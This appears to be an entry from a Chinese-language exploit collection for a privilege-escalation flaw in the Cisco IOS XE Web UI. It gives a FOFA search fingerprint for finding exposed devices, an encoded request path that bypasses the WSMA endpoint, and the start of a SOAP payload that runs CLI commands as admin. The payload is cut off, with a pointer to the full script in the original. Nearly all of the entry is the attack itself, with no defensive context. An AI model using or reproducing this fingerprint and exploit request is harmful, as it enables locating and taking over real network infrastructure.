# CiscoIOSXEWebUI存在权限提升漏洞

- **系统**：CiscoIOSXEWebUI　|　**类型**：权限提升　|　**CVE**：—
- **指纹**：`FOFA:body="<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>"`
- **请求**：`POST /%2577eb%2575i_%2577sma_Http HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false">…（脚本共 720 字，完整版见原文）
```